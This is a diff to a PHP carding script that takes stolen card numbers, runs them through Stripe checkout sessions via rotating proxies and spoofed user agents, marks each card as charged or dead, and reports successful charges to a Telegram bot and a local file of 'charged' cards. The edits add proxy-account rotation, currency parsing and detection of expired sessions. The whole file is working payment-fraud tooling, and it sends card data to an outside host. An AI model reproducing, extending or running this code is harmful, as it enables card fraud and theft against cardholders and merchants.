@@ -117,24 +117,19 @@ if (empty($_GET['xemail'])) {
     $xemail = str_replace('@', '%40', $email);
 }
 
+// rotating proxy by Alice if failed hosting server magiging ip
 $hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
 $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
-$ips_accounts = array(
-1 =>    //'104.234.11.110:8020',
-        //'172.86.123.167:8020',
-        //'157.254.195.104:8020',
-        '', //this is your default hosting server, so just leave it blank
-        //'166.0.94.105:8020',
-        //'45.147.228.20:8020',
-        //'166.0.94.111:8020',
-        //'188.191.106.251:8020',
-        //'109.105.198.174:8020',
-        //'85.208.107.228:8020',
-        //'109.105.198.161:8020'
+$ip_nums = array(
+1 =>    ''
     );
-$rotateips = $ips_accounts[array_rand($ips_accounts)];
+$rotateips = $ip_nums[array_rand($ip_nums)];
+$ip_accounts = array(
+1 =>    ''
+    );
+$rotateaccounts = $ip_accounts[array_rand($ip_accounts)];
 $proxy = !empty($ip) ? $ip : ''.$rotateips.'';
-$proxyauth = !empty($hydra) ? $hydra : '';
+$proxyauth = !empty($hydra) ? $hydra : ''.$rotateaccounts.'';
 
 list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
 $scc = implode('+', str_split($cc, 4));
@@ -194,36 +189,6 @@ $myip = "";
 }
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
-if (!empty($proxy)) {
-    curl_setopt($ch, CURLOPT_PROXY, $proxy);
-    if (!empty($proxyauth)) {
-        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
-    }
-}
-curl_setopt($ch, CURLOPT_POST, 1);
-$headers = array();
-$headers[] = 'accept: application/json';
-$headers[] = 'content-type: application/x-www-form-urlencoded';
-$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
-$headers[] = 'origin: https://checkout.stripe.com';
-$headers[] = 'sec-fetch-site: same-site';
-$headers[] = 'sec-fetch-mode: cors';
-$headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'referer: https://checkout.stripe.com/';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
-curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key='.$pk.'');
-$curl = curl_exec($ch);
-curl_close($ch);
-
-$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/init');
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
@@ -255,7 +220,38 @@ curl_close($ch);
  $curl;
  $amttt = g($curl,'"unit_amount_decimal": "','"');
  $xmail = g($curl,'"customer_email": "','"');
+ $currency = g($curl,'"currency": "','"');
+ $sessionstatus = json_decode($curl, true)['error']['message'];
 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
+if (!empty($proxy)) {
+    curl_setopt($ch, CURLOPT_PROXY, $proxy);
+    if (!empty($proxyauth)) {
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+    }
+}
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
+$headers[] = 'origin: https://checkout.stripe.com';
+$headers[] = 'sec-fetch-site: same-site';
+$headers[] = 'sec-fetch-mode: cors';
+$headers[] = 'sec-fetch-dest: empty';
+$headers[] = 'referer: https://checkout.stripe.com/';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key='.$pk.'');
+curl_exec($ch);
+curl_close($ch);
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
@@ -490,7 +486,7 @@ $chatID = urlencode('-1001815647781');
 $amttt = intval($amttt)/100;
 
 #############SEND TO TG BOT WHEN CHARGED
-$charged_message = "Successful Checkout\r\n\nBIN:\r\n$card\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: $amttt\r\n\nChecked from:\r\n$domain";
+$charged_message = "Successful Checkout\r\n\nBIN:\r\n$card\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: ".strtoupper($currency)."$amttt\r\n\nChecked from:\r\n$domain";
 $sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
@@ -508,7 +504,7 @@ if (strpos($final, '"status": "succeeded"')) {
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white"><b>'.$cc.'|'.$mm.'|'.$yy.'</b></font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
+    echo ''.$myip.'<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$cc.'|'.$mm.'|'.$yy.'</b></font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.strtoupper($currency).''.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
     fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
     }
 exit;
@@ -526,8 +522,8 @@ elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
    
     echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Blocked by CAPTCHA (change your proxy)</span><br>";
 }
-elseif(strpos($ppage2, '"message": "Your payment has already been processed."')){
-    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired</span><br>";
+elseif($sessionstatus === 'This Checkout Session is no longer active.'){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired or maybe paid already.</span><br>";
 }
 elseif($status == "requires_action"){
     echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>";
